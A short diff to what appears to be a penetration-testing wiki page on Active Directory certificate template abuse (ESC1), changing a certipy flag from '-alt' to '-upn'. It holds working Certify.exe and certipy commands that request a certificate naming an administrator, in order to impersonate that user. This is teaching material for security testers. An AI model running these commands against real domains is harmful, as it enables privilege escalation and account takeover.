@@ -46,7 +46,7 @@ To **abuse this vulnerability to impersonate an administrator** one could run:
 
 ```bash
 Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
-certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
 ```
 
 Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
